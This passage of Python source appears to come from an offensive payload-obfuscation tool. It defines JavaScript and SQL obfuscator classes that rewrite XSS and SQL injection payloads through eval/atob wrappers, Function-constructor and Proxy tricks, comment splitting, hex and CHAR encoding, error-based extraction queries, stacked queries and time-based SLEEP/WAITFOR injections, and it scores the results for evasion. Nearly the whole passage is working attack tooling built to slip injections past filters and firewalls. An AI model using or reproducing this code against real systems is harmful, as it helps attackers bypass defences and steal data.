            "size_original": self.size_original,
            "size_obfuscated": self.size_obfuscated,
            "size_ratio": round(self.size_ratio, 4),
            "entropy_original": round(self.entropy_original, 4),
            "entropy_obfuscated": round(self.entropy_obfuscated, 4),
            "entropy_delta": round(self.entropy_delta, 4),
            "evasion_score": round(self.evasion_score, 4),
            "timestamp": self.timestamp,
            "metadata": self.metadata,
        }


@dataclass
class ObfuscationReport:
    """Comprehensive obfuscation report with statistics and results."""
    report_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    created_at: float = field(default_factory=time.time)
    total_payloads: int = 0
    total_variants: int = 0
    languages_used: List[str] = field(default_factory=list)
    levels_used: List[str] = field(default_factory=list)
    techniques_used: List[str] = field(default_factory=list)
    results: List[ObfuscationResult] = field(default_factory=list)
    avg_evasion_score: float = 0.0
    avg_size_ratio: float = 0.0
    avg_entropy_delta: float = 0.0
    best_technique: str = ""
    best_evasion_score: float = 0.0
    worst_technique: str = ""
    worst_evasion_score: float = 1.0
    effectiveness_scores: Dict[str, float] = field(default_factory=dict)
    technique_stats: Dict[str, Dict[str, Any]] = field(default_factory=dict)
    duration_seconds: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "created_at": self.created_at,
            "total_payloads": self.total_payloads,
            "total_variants": self.total_variants,
            "languages_used": self.languages_used,
            "levels_used": self.levels_used,
            "techniques_used": self.techniques_used,
            "results": [r.to_dict() for r in self.results],
            "avg_evasion_score": round(self.avg_evasion_score, 4),
            "avg_size_ratio": round(self.avg_size_ratio, 4),
            "avg_entropy_delta": round(self.avg_entropy_delta, 4),
            "best_technique": self.best_technique,
            "best_evasion_score": round(self.best_evasion_score, 4),
            "worst_technique": self.worst_technique,
            "worst_evasion_score": round(self.worst_evasion_score, 4),
            "effectiveness_scores": {
                k: round(v, 4) for k, v in self.effectiveness_scores.items()
            },
            "technique_stats": self.technique_stats,
            "duration_seconds": round(self.duration_seconds, 4),
            "metadata": self.metadata,
        }


# ════════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ════════════════════════════════════════════════════════════════════════════════

def _calculate_entropy(data: str) -> float:
    """Calculate Shannon entropy of a string."""
    if not data:
        return 0.0
    freq: Dict[str, int] = defaultdict(int)
    for ch in data:
        freq[ch] += 1
    length = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


def _random_var_name(length: int = 6) -> str:
    """Generate a random variable name."""
    first = random.choice(string.ascii_lowercase + "_")
    rest = "".join(random.choices(string.ascii_lowercase + string.digits + "_", k=length - 1))
    return first + rest


def _random_whitespace() -> str:
    """Generate random whitespace for padding."""
    return " " * random.randint(1, 4)


def _split_string_random(s: str, min_chunk: int = 1, max_chunk: int = 4) -> List[str]:
    """Split string into random-sized chunks."""
    chunks: List[str] = []
    i = 0
    while i < len(s):
        size = random.randint(min_chunk, min(max_chunk, len(s) - i))
        chunks.append(s[i:i + size])
        i += size
    return chunks


def _char_to_hex_escape(ch: str) -> str:
    """Convert character to hex escape sequence."""
    return f"\\x{ord(ch):02x}"


def _char_to_unicode_escape(ch: str) -> str:
    """Convert character to unicode escape sequence."""
    return f"\\u{ord(ch):04x}"


def _char_to_octal_escape(ch: str) -> str:
    """Convert character to octal escape sequence."""
    return f"\\{ord(ch):03o}"


def _level_value(level: ObfuscationLevel) -> int:
    """Get numeric value for obfuscation level comparison."""
    return {
        ObfuscationLevel.LIGHT: 1,
        ObfuscationLevel.MEDIUM: 2,
        ObfuscationLevel.HEAVY: 3,
        ObfuscationLevel.EXTREME: 4,
    }.get(level, 1)


def _technique_available(technique: ObfuscationTechnique, level: ObfuscationLevel) -> bool:
    """Check if technique is available at the given obfuscation level."""
    info = TECHNIQUE_INFO.get(technique, {})
    min_level = info.get("min_level", ObfuscationLevel.LIGHT)
    return _level_value(level) >= _level_value(min_level)


# ════════════════════════════════════════════════════════════════════════════════
# JAVASCRIPT OBFUSCATOR
# ════════════════════════════════════════════════════════════════════════════════

class JSObfuscator:
    """
    JavaScript payload obfuscation engine.

    Provides 16+ techniques for JS payload transformation including
    String.fromCharCode, template literal abuse, eval alternatives,
    DOM-based construction, Proxy exploitation, and encoding tricks.

    Usage:
        obf = JSObfuscator()
        result = obf.obfuscate_fromcharcode("alert(1)")
        print(result)  # String.fromCharCode(97,108,101,114,116,40,49,41)
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._stats: Dict[str, int] = defaultdict(int)
        logger.debug("JSObfuscator initialized")

    # ── String.fromCharCode ──────────────────────────────────────────────
    def obfuscate_fromcharcode(self, payload: str) -> str:
        """Convert payload to String.fromCharCode() construction."""
        with self._lock:
            self._stats["fromcharcode"] += 1
            codes = ",".join(str(ord(c)) for c in payload)
            return f"String.fromCharCode({codes})"

    def obfuscate_fromcharcode_spread(self, payload: str) -> str:
        """String.fromCharCode with spread operator from array."""
        with self._lock:
            self._stats["fromcharcode_spread"] += 1
            codes = ",".join(str(ord(c)) for c in payload)
            var = _random_var_name()
            return f"var {var}=[{codes}];String.fromCharCode(...{var})"

    def obfuscate_fromcharcode_apply(self, payload: str) -> str:
        """String.fromCharCode via apply() with null context."""
        with self._lock:
            self._stats["fromcharcode_apply"] += 1
            codes = ",".join(str(ord(c)) for c in payload)
            return f"String.fromCharCode.apply(null,[{codes}])"

    def obfuscate_fromcharcode_mapped(self, payload: str) -> str:
        """Build charCode array with map and offset obfuscation."""
        with self._lock:
            self._stats["fromcharcode_mapped"] += 1
            offset = random.randint(10, 99)
            codes = ",".join(str(ord(c) + offset) for c in payload)
            var = _random_var_name()
            return (
                f"var {var}=[{codes}];"
                f"String.fromCharCode.apply(null,{var}.map(function(c){{return c-{offset}}}))"
            )

    # ── Template Literal Abuse ───────────────────────────────────────────
    def obfuscate_template_literal(self, payload: str) -> str:
        """Abuse ES6 template literals with embedded expressions."""
        with self._lock:
            self._stats["template_literal"] += 1
            parts: List[str] = []
            for ch in payload:
                if random.random() < 0.5:
                    parts.append(f"${{{repr(ch)}}}")
                else:
                    parts.append(f"${{String.fromCharCode({ord(ch)})}}")
            return "`" + "".join(parts) + "`"

    def obfuscate_template_tagged(self, payload: str) -> str:
        """Tagged template literal with custom tag function."""
        with self._lock:
            self._stats["template_tagged"] += 1
            tag = _random_var_name()
            var = _random_var_name()
            codes = ",".join(str(ord(c)) for c in payload)
            return (
                f"function {tag}({var}){{return String.fromCharCode({codes})}}"
                f"{tag}`dummy`"
            )

    # ── Eval Alternatives ────────────────────────────────────────────────
    def obfuscate_function_constructor(self, payload: str) -> str:
        """Use Function() constructor as eval alternative."""
        with self._lock:
            self._stats["function_constructor"] += 1
            escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
            return f"Function('{escaped}')()"

    def obfuscate_settimeout(self, payload: str) -> str:
        """Execute code via setTimeout string argument."""
        with self._lock:
            self._stats["settimeout"] += 1
            escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
            return f"setTimeout('{escaped}',0)"

    def obfuscate_setinterval(self, payload: str) -> str:
        """Execute code via setInterval (clears itself)."""
        with self._lock:
            self._stats["setinterval"] += 1
            escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
            var = _random_var_name()
            return f"var {var}=setInterval('{escaped};clearInterval({var})',0)"

    # ── DOM-Based String Construction ────────────────────────────────────
    def obfuscate_dom_construction(self, payload: str) -> str:
        """Build string via DOM element manipulation."""
        with self._lock:
            self._stats["dom_construction"] += 1
            var_el = _random_var_name()
            var_result = _random_var_name()
            lines = [f"var {var_el}=document.createElement('div');"]
            lines.append(f"var {var_result}='';")
            for ch in payload:
                lines.append(
                    f"{var_el}.setAttribute('data-c',String.fromCharCode({ord(ch)}));"
                    f"{var_result}+={var_el}.getAttribute('data-c');"
                )
            lines.append(f"eval({var_result});")
            return "".join(lines)

    def obfuscate_dom_innerhtml(self, payload: str) -> str:
        """Build payload via innerHTML text extraction."""
        with self._lock:
            self._stats["dom_innerhtml"] += 1
            encoded = "".join(f"&#x{ord(c):x};" for c in payload)
            var = _random_var_name()
            return (
                f"var {var}=document.createElement('p');"
                f"{var}.innerHTML='{encoded}';"
                f"eval({var}.textContent)"
            )

    # ── Proxy Handler Exploitation ───────────────────────────────────────
    def obfuscate_proxy_handler(self, payload: str) -> str:
        """Exploit Proxy handler traps for indirect execution."""
        with self._lock:
            self._stats["proxy_handler"] += 1
            escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
            var_handler = _random_var_name()
            var_proxy = _random_var_name()
            return (
                f"var {var_handler}={{get:function(t,p){{return Function('{escaped}')()}}}};"
                f"var {var_proxy}=new Proxy({{}},{var_handler});"
                f"{var_proxy}.x"
            )

    def obfuscate_proxy_apply(self, payload: str) -> str:
        """Proxy apply trap for function call interception."""
        with self._lock:
            self._stats["proxy_apply"] += 1
            escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
            var_h = _random_var_name()
            var_p = _random_var_name()
            return (
                f"var {var_h}={{apply:function(){{return Function('{escaped}')()}}}};"
                f"var {var_p}=new Proxy(function(){{}},{var_h});"
                f"{var_p}()"
            )

    # ── Array Join ───────────────────────────────────────────────────────
    def obfuscate_array_join(self, payload: str) -> str:
        """Split payload into character array and join."""
        with self._lock:
            self._stats["array_join"] += 1
            chars = ",".join(f"'{c}'" if c != "'" else '"\'"' for c in payload)
            return f"[{chars}].join('')"

    def obfuscate_array_join_shuffled(self, payload: str) -> str:
        """Shuffled array with index-based reconstruction."""
        with self._lock:
            self._stats["array_join_shuffled"] += 1
            indices = list(range(len(payload)))
            shuffled = indices[:]
            random.shuffle(shuffled)
            chars_arr: List[str] = [""] * len(payload)
            for new_idx, orig_idx in enumerate(shuffled):
                ch = payload[orig_idx]
                chars_arr[new_idx] = f"'{ch}'" if ch != "'" else '"\'"'
            order = ",".join(str(shuffled.index(i)) for i in range(len(payload)))
            var_a = _random_var_name()
            var_o = _random_var_name()
            return (
                f"var {var_a}=[{','.join(chars_arr)}];"
                f"var {var_o}=[{order}];"
                f"{var_o}.map(function(i){{return {var_a}[i]}}).join('')"
            )

    # ── Reverse String ───────────────────────────────────────────────────
    def obfuscate_reverse_string(self, payload: str) -> str:
        """Reverse the payload and reconstruct at runtime."""
        with self._lock:
            self._stats["reverse_string"] += 1
            reversed_payload = payload[::-1]
            escaped = reversed_payload.replace("\\", "\\\\").replace("'", "\\'")
            return f"'{escaped}'.split('').reverse().join('')"

    # ── Base64 atob ──────────────────────────────────────────────────────
    def obfuscate_base64_atob(self, payload: str) -> str:
        """Base64 encode payload and decode via atob()."""
        with self._lock:
            self._stats["base64_atob"] += 1
            b64 = base64.b64encode(payload.encode()).decode()
            return f"atob('{b64}')"

    def obfuscate_base64_atob_eval(self, payload: str) -> str:
        """Base64 encode and eval via atob()."""
        with self._lock:
            self._stats["base64_atob_eval"] += 1
            b64 = base64.b64encode(payload.encode()).decode()
            return f"eval(atob('{b64}'))"

    # ── Unicode Escape Sequences ─────────────────────────────────────────
    def obfuscate_unicode_escape(self, payload: str) -> str:
        """Replace characters with \\uXXXX escape sequences."""
        with self._lock:
            self._stats["unicode_escape"] += 1
            escaped = "".join(_char_to_unicode_escape(c) for c in payload)
            return f"'{escaped}'"

    def obfuscate_unicode_partial(self, payload: str) -> str:
        """Partially replace characters with unicode escapes."""
        with self._lock:
            self._stats["unicode_partial"] += 1
            result: List[str] = []
            for c in payload:
                if random.random() < 0.6:
                    result.append(_char_to_unicode_escape(c))
                else:
                    result.append(c if c not in ("'", "\\") else f"\\{c}")
            return "'" + "".join(result) + "'"

    # ── Octal Escapes ────────────────────────────────────────────────────
    def obfuscate_octal_escape(self, payload: str) -> str:
        """Use octal escape sequences in string literals."""
        with self._lock:
            self._stats["octal_escape"] += 1
            escaped = "".join(_char_to_octal_escape(c) for c in payload)
            return f"'{escaped}'"

    # ── Hex Escapes ──────────────────────────────────────────────────────
    def obfuscate_hex_escape(self, payload: str) -> str:
        """Use \\xHH hex escape sequences."""
        with self._lock:
            self._stats["hex_escape"] += 1
            escaped = "".join(_char_to_hex_escape(c) for c in payload)
            return f"'{escaped}'"

    def obfuscate_hex_mixed(self, payload: str) -> str:
        """Mix hex escapes with plain characters."""
        with self._lock:
            self._stats["hex_mixed"] += 1
            result: List[str] = []
            for c in payload:
                if random.random() < 0.5 or c in ("'", "\\"):
                    result.append(_char_to_hex_escape(c))
                else:
                    result.append(c)
            return "'" + "".join(result) + "'"

    # ── Bracket Notation Property Access ─────────────────────────────────
    def obfuscate_bracket_notation(self, payload: str) -> str:
        """Replace dot property access with bracket notation."""
        with self._lock:
            self._stats["bracket_notation"] += 1
            result = re.sub(
                r'(\w+)\.(\w+)',
                lambda m: f"{m.group(1)}['{m.group(2)}']",
                payload,
            )
            return result

    def obfuscate_bracket_computed(self, payload: str) -> str:
        """Bracket notation with computed property names."""
        with self._lock:
            self._stats["bracket_computed"] += 1
            def _replace(m: re.Match) -> str:
                obj = m.group(1)
                prop = m.group(2)
                method = random.choice([
                    f"[String.fromCharCode({','.join(str(ord(c)) for c in prop)})]",
                    f"[atob('{base64.b64encode(prop.encode()).decode()}')]",
                    f"[['{prop}'[0],'{prop}'[1:]].join('')]"
                    if len(prop) > 1 else f"['{prop}']",
                ])
                return f"{obj}{method}"
            return re.sub(r'(\w+)\.(\w+)', _replace, payload)

    # ── constructor.constructor ───────────────────────────────────────────
    def obfuscate_constructor_chain(self, payload: str) -> str:
        """Access Function via constructor chain."""
        with self._lock:
            self._stats["constructor_chain"] += 1
            escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
            return f"[].constructor.constructor('{escaped}')()"

    def obfuscate_constructor_fromcharcode(self, payload: str) -> str:
        """Constructor chain with fromCharCode payload."""
        with self._lock:
            self._stats["constructor_fromcharcode"] += 1
            codes = ",".join(str(ord(c)) for c in payload)
            return (
                f"[].constructor.constructor("
                f"String.fromCharCode({codes})"
                f")()"
            )

    # ── unescape() ───────────────────────────────────────────────────────
    def obfuscate_unescape(self, payload: str) -> str:
        """URL-encode payload and decode via unescape()."""
        with self._lock:
            self._stats["unescape"] += 1
            encoded = "".join(f"%{ord(c):02X}" for c in payload)
            return f"unescape('{encoded}')"

    def obfuscate_unescape_eval(self, payload: str) -> str:
        """unescape with eval for execution."""
        with self._lock:
            self._stats["unescape_eval"] += 1
            encoded = "".join(f"%{ord(c):02X}" for c in payload)
            return f"eval(unescape('{encoded}'))"

    # ── Combined Techniques ──────────────────────────────────────────────
    def obfuscate_combined(self, payload: str, level: ObfuscationLevel) -> str:
        """Apply multiple techniques based on obfuscation level."""
        with self._lock:
            self._stats["combined"] += 1
            lv = _level_value(level)
            result = payload
            if lv >= 1:
                result = self.obfuscate_fromcharcode(result)
            if lv >= 2:
                b64 = base64.b64encode(result.encode()).decode()
                result = f"eval(atob('{b64}'))"
            if lv >= 3:
                escaped = result.replace("\\", "\\\\").replace("'", "\\'")
                result = f"[].constructor.constructor('{escaped}')()"
            if lv >= 4:
                hex_result = "".join(_char_to_hex_escape(c) for c in result)
                var = _random_var_name()
                result = f"var {var}='{hex_result}';Function({var})()"
            return result

    def get_all_variants(self, payload: str, count: int = 10) -> List[str]:
        """Generate multiple obfuscation variants."""
        methods = [
            self.obfuscate_fromcharcode,
            self.obfuscate_fromcharcode_spread,
            self.obfuscate_fromcharcode_apply,
            self.obfuscate_fromcharcode_mapped,
            self.obfuscate_template_literal,
            self.obfuscate_function_constructor,
            self.obfuscate_settimeout,
            self.obfuscate_setinterval,
            self.obfuscate_array_join,
            self.obfuscate_array_join_shuffled,
            self.obfuscate_reverse_string,
            self.obfuscate_base64_atob,
            self.obfuscate_base64_atob_eval,
            self.obfuscate_unicode_escape,
            self.obfuscate_unicode_partial,
            self.obfuscate_octal_escape,
            self.obfuscate_hex_escape,
            self.obfuscate_hex_mixed,
            self.obfuscate_bracket_notation,
            self.obfuscate_constructor_chain,
            self.obfuscate_constructor_fromcharcode,
            self.obfuscate_unescape,
            self.obfuscate_unescape_eval,
        ]
        random.shuffle(methods)
        variants: List[str] = []
        for method in methods[:count]:
            try:
                variants.append(method(payload))
            except Exception as exc:
                logger.warning("JS variant generation failed: %s", exc)
        return variants

    def get_stats(self) -> Dict[str, int]:
        """Return technique usage statistics."""
        with self._lock:
            return dict(self._stats)


# ════════════════════════════════════════════════════════════════════════════════
# SQL OBFUSCATOR
# ════════════════════════════════════════════════════════════════════════════════

class SQLObfuscator:
    """
    SQL payload obfuscation engine.

    Provides 16+ techniques for SQL injection payload transformation
    across MySQL, MSSQL, PostgreSQL, and Oracle databases.

    Usage:
        obf = SQLObfuscator()
        result = obf.obfuscate_comment_injection("UNION SELECT")
        print(result)  # U/**/NI/**/ON/**/SE/**/LE/**/CT
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._stats: Dict[str, int] = defaultdict(int)
        self._comment_styles = [
            ("/**/", "/**/"),
            ("/*!*/", "/*!*/"),
            ("/*!", "*/"),
            ("/**_**/", "/**_**/"),
        ]
        logger.debug("SQLObfuscator initialized")

    # ── CASE WHEN Alternatives ───────────────────────────────────────────
    def obfuscate_case_when(self, payload: str) -> str:
        """Replace IF constructs with CASE WHEN ... THEN ... ELSE ... END."""
        with self._lock:
            self._stats["case_when"] += 1
            result = re.sub(
                r'IF\s*\(([^,]+),([^,]+),([^)]+)\)',
                r'CASE WHEN \1 THEN \2 ELSE \3 END',
                payload,
                flags=re.IGNORECASE,
            )
            return result

    def obfuscate_case_when_nested(self, payload: str) -> str:
        """Nested CASE WHEN for deeper obfuscation."""
        with self._lock:
            self._stats["case_when_nested"] += 1
            result = re.sub(
                r'IF\s*\(([^,]+),([^,]+),([^)]+)\)',
                r'CASE WHEN (CASE WHEN 1=1 THEN \1 END) THEN \2 ELSE \3 END',
                payload,
                flags=re.IGNORECASE,
            )
            return result

    # ── IIF Function ─────────────────────────────────────────────────────
    def obfuscate_iif(self, payload: str) -> str:
        """Replace IF with IIF() inline conditional."""
        with self._lock:
            self._stats["iif"] += 1
            result = re.sub(
                r'IF\s*\(([^,]+),([^,]+),([^)]+)\)',
                r'IIF(\1,\2,\3)',
                payload,
                flags=re.IGNORECASE,
            )
            return result

    # ── String CONCAT Variants ───────────────────────────────────────────
    def obfuscate_concat_mysql(self, payload: str) -> str:
        """MySQL CONCAT() string building."""
        with self._lock:
            self._stats["concat_mysql"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                chunks = _split_string_random(s, 1, 3)
                concat_parts = ",".join(f"'{chunk}'" for chunk in chunks)
                concat_expr = f"CONCAT({concat_parts})"
                result = result.replace(f"'{s}'", concat_expr, 1)
            return result

    def obfuscate_concat_mysql_ws(self, payload: str) -> str:
        """MySQL CONCAT_WS() with empty separator."""
        with self._lock:
            self._stats["concat_mysql_ws"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                chunks = _split_string_random(s, 1, 3)
                concat_parts = ",".join(f"'{chunk}'" for chunk in chunks)
                concat_expr = f"CONCAT_WS('',{concat_parts})"
                result = result.replace(f"'{s}'", concat_expr, 1)
            return result

    def obfuscate_concat_mssql(self, payload: str) -> str:
        """MSSQL + operator string concatenation."""
        with self._lock:
            self._stats["concat_mssql"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                chunks = _split_string_random(s, 1, 3)
                concat_expr = "+".join(f"'{chunk}'" for chunk in chunks)
                result = result.replace(f"'{s}'", concat_expr, 1)
            return result

    def obfuscate_concat_postgres(self, payload: str) -> str:
        """PostgreSQL || operator string concatenation."""
        with self._lock:
            self._stats["concat_postgres"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                chunks = _split_string_random(s, 1, 3)
                concat_expr = "||".join(f"'{chunk}'" for chunk in chunks)
                result = result.replace(f"'{s}'", concat_expr, 1)
            return result

    def obfuscate_concat_oracle(self, payload: str) -> str:
        """Oracle || operator and CONCAT() function."""
        with self._lock:
            self._stats["concat_oracle"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                chunks = _split_string_random(s, 1, 3)
                if len(chunks) == 1:
                    continue
                # Oracle CONCAT only takes 2 args, so nest them
                expr = f"'{chunks[0]}'"
                for chunk in chunks[1:]:
                    expr = f"CONCAT({expr},'{chunk}')"
                result = result.replace(f"'{s}'", expr, 1)
            return result

    # ── Hex Encoding ─────────────────────────────────────────────────────
    def obfuscate_hex_encoding(self, payload: str) -> str:
        """Encode strings as hex literals (0x414243)."""
        with self._lock:
            self._stats["hex_encoding"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                hex_val = "0x" + s.encode().hex()
                result = result.replace(f"'{s}'", hex_val, 1)
            return result

    def obfuscate_hex_unhex(self, payload: str) -> str:
        """Use UNHEX() function for hex decoding (MySQL)."""
        with self._lock:
            self._stats["hex_unhex"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                hex_val = s.encode().hex()
                result = result.replace(f"'{s}'", f"UNHEX('{hex_val}')", 1)
            return result

    # ── Comment Injection ────────────────────────────────────────────────
    def obfuscate_comment_injection(self, payload: str) -> str:
        """Inject inline comments between SQL keywords to break signatures."""
        with self._lock:
            self._stats["comment_injection"] += 1
            keywords = [
                "SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
                "ORDER", "BY", "GROUP", "HAVING", "LIMIT",
                "JOIN", "LEFT", "RIGHT", "INNER", "OUTER",
            ]
            result = payload
            for kw in keywords:
                pattern = re.compile(re.escape(kw), re.IGNORECASE)
                matches = list(pattern.finditer(result))
                for match in reversed(matches):
                    original = match.group(0)
                    if len(original) > 2:
                        mid = len(original) // 2
                        commented = original[:mid] + "/**/" + original[mid:]
                        result = result[:match.start()] + commented + result[match.end():]
            return result

    def obfuscate_comment_version(self, payload: str) -> str:
        """MySQL version-specific comment injection /*!50000 */."""
        with self._lock:
            self._stats["comment_version"] += 1
            keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
            result = payload
            for kw in keywords:
                version = random.randint(40000, 59999)
                pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
                result = pattern.sub(f"/*!{version} {kw} */", result)
            return result

    def obfuscate_comment_multiline(self, payload: str) -> str:
        """Insert multi-line comment variations."""
        with self._lock:
            self._stats["comment_multiline"] += 1
            result = ""
            i = 0
            while i < len(payload):
                if payload[i] == " ":
                    comment_style = random.choice(["/**/", "/* */", "/*x*/", "/*!*/"])
                    result += comment_style
                else:
                    result += payload[i]
                i += 1
            return result

    # ── Scientific Notation ──────────────────────────────────────────────
    def obfuscate_scientific_notation(self, payload: str) -> str:
        """Represent numbers in scientific notation."""
        with self._lock:
            self._stats["scientific_notation"] += 1
            def _to_scientific(m: re.Match) -> str:
                num = int(m.group(0))
                if num == 0:
                    return "0e0"
                if num == 1:
                    return "1e0"
                exp = int(math.log10(abs(num))) if num != 0 else 0
                mantissa = num / (10 ** exp) if exp > 0 else num
                return f"{mantissa}e{exp}"
            return re.sub(r'\b(\d+)\b', _to_scientific, payload)

    # ── CHAR/CHR Function ────────────────────────────────────────────────
    def obfuscate_char_function(self, payload: str, db_type: str = "mysql") -> str:
        """Build strings using CHAR() or CHR() function calls."""
        with self._lock:
            self._stats["char_function"] += 1
            func = "CHR" if db_type.lower() in ("oracle", "postgres", "postgresql") else "CHAR"
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                if db_type.lower() in ("oracle", "postgres", "postgresql"):
                    chars = "||".join(f"{func}({ord(c)})" for c in s)
                else:
                    chars = ",".join(str(ord(c)) for c in s)
                    chars = f"{func}({chars})"
                result = result.replace(f"'{s}'", chars, 1)
            return result

    def obfuscate_char_concat(self, payload: str) -> str:
        """CHAR function with CONCAT wrapper."""
        with self._lock:
            self._stats["char_concat"] += 1
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                char_exprs = [f"CHAR({ord(c)})" for c in s]
                concat_expr = f"CONCAT({','.join(char_exprs)})"
                result = result.replace(f"'{s}'", concat_expr, 1)
            return result

    # ── information_schema Alternatives ──────────────────────────────────
    def obfuscate_info_schema_alt(self, payload: str) -> str:
        """Replace information_schema with alternative system views."""
        with self._lock:
            self._stats["info_schema_alt"] += 1
            replacements = {
                "information_schema.tables": "sys.tables",
                "information_schema.columns": "sys.columns",
                "information_schema.schemata": "sys.databases",
                "INFORMATION_SCHEMA.TABLES": "sys.tables",
                "INFORMATION_SCHEMA.COLUMNS": "sys.columns",
            }
            result = payload
            for old, new in replacements.items():
                result = result.replace(old, new)
            return result

    def obfuscate_info_schema_mysql(self, payload: str) -> str:
        """MySQL-specific information_schema alternatives."""
        with self._lock:
            self._stats["info_schema_mysql"] += 1
            replacements = {
                "information_schema.tables": "mysql.innodb_table_stats",
                "information_schema.columns": "mysql.innodb_index_stats",
            }
            result = payload
            for old, new in replacements.items():
                result = result.replace(old, new)
                result = result.replace(old.upper(), new)
            return result

    # ── System Table Alternatives ────────────────────────────────────────
    def obfuscate_system_table_alt(self, payload: str) -> str:
        """Replace system table references with alternatives."""
        with self._lock:
            self._stats["system_table_alt"] += 1
            replacements = {
                "sysobjects": "sys.objects",
                "syscolumns": "sys.all_columns",
                "sysusers": "sys.database_principals",
                "master..sysdatabases": "sys.databases",
                "pg_tables": "pg_catalog.pg_tables",
                "pg_user": "pg_catalog.pg_user",
                "all_tables": "dba_tables",
            }
            result = payload
            for old, new in replacements.items():
                result = result.replace(old, new)
            return result

    # ── Nested Function Calls ────────────────────────────────────────────
    def obfuscate_nested_functions(self, payload: str) -> str:
        """Wrap expressions in nested function calls."""
        with self._lock:
            self._stats["nested_functions"] += 1
            wrappers = [
                ("REVERSE(REVERSE({}))", None),
                ("UPPER(LOWER({}))", None),
                ("LOWER(UPPER({}))", None),
                ("TRIM({})", None),
                ("LTRIM(RTRIM({}))", None),
                ("REPLACE({},chr(0),'')", "oracle"),
                ("IFNULL({},NULL)", "mysql"),
                ("COALESCE({},NULL)", None),
            ]
            strings = re.findall(r"'([^']*)'", payload)
            result = payload
            for s in strings:
                wrapper, db_constraint = random.choice(wrappers)
                wrapped = wrapper.format(f"'{s}'")
                result = result.replace(f"'{s}'", wrapped, 1)
            return result

    # ── Double Query ─────────────────────────────────────────────────────
    def obfuscate_double_query(self, payload: str) -> str:
        """Wrap payload as subquery for double query technique."""
        with self._lock:
            self._stats["double_query"] += 1
            if re.search(r'\bSELECT\b', payload, re.IGNORECASE):
                return f"SELECT * FROM ({payload}) AS {_random_var_name()}"
            return payload

    def obfuscate_double_query_error(self, payload: str) -> str:
        """Error-based double query for data extraction."""
        with self._lock:
            self._stats["double_query_error"] += 1
            return (
                f"SELECT 1 FROM(SELECT COUNT(*),CONCAT(({payload}),"
                f"FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a"
            )

    # ── Stacked Queries ──────────────────────────────────────────────────
    def obfuscate_stacked_queries(self, payload: str, extra: str = "") -> str:
        """Append additional queries via semicolon."""
        with self._lock:
            self._stats["stacked_queries"] += 1
            if extra:
                return f"{payload};{extra}"
            return f"{payload};SELECT 1"

    def obfuscate_stacked_waitfor(self, payload: str, delay: float = 5.0) -> str:
        """Stacked query with WAITFOR DELAY (MSSQL)."""
        with self._lock:
            self._stats["stacked_waitfor"] += 1
            seconds = int(delay)
            return f"{payload};WAITFOR DELAY '0:0:{seconds}'"

    # ── Benchmark/Sleep Alternatives ─────────────────────────────────────
    def obfuscate_benchmark_sleep(self, payload: str, db_type: str = "mysql") -> str:
        """Alternative time-based injection methods."""
        with self._lock:
            self._stats["benchmark_sleep"] += 1
            sleep_funcs = {
                "mysql": "SLEEP(5)",
                "mysql_benchmark": "BENCHMARK(10000000,SHA1('test'))",
                "mssql": "WAITFOR DELAY '0:0:5'",
                "postgres": "pg_sleep(5)",
                "postgresql": "pg_sleep(5)",
                "oracle": "DBMS_LOCK.SLEEP(5)",
            }
            sleep_expr = sleep_funcs.get(db_type.lower(), "SLEEP(5)")
            if "IF" in payload.upper() or "CASE" in payload.upper():
                return payload.replace("SLEEP(", sleep_expr.split("(")[0] + "(")
            return f"{payload} AND {sleep_expr}"

    def obfuscate_benchmark_heavy(self, payload: str) -> str:
        """Heavy computation as timing alternative."""
        with self._lock:
            self._stats["benchmark_heavy"] += 1
            iterations = random.randint(5000000, 15000000)
            return f"{payload} AND BENCHMARK({iterations},SHA1(REPEAT('A',1000)))"

    # ── Combined ─────────────────────────────────────────────────────────
    def obfuscate_combined(self, payload: str, level: ObfuscationLevel,
                           db_type: str = "mysql") -> str:
        """Apply multiple SQL techniques based on level."""
        with self._lock:
            self._stats["combined"] += 1
            lv = _level_value(level)
            result = payload
            if lv >= 1:
                result = self.obfuscate_comment_injection(result)
            if lv >= 2:
                result = self.obfuscate_char_function(result, db_type)
            if lv >= 3:
                result = self.obfuscate_nested_functions(result)
            if lv >= 4:
                result = self.obfuscate_hex_encoding(result)
            return result

    def get_all_variants(self, payload: str, count: int = 10,
                         db_type: str = "mysql") -> List[str]:
        """Generate multiple SQL obfuscation variants."""
        methods: List[Callable] = [
            self.obfuscate_case_when,
            self.obfuscate_iif,
            lambda p: self.obfuscate_concat_mysql(p),
            lambda p: self.obfuscate_concat_mssql(p),
            lambda p: self.obfuscate_concat_postgres(p),
            lambda p: self.obfuscate_concat_oracle(p),
            self.obfuscate_hex_encoding,
            self.obfuscate_comment_injection,
            self.obfuscate_comment_version,
            self.obfuscate_comment_multiline,
            self.obfuscate_scientific_notation,
            lambda p: self.obfuscate_char_function(p, db_type),
            self.obfuscate_nested_functions,
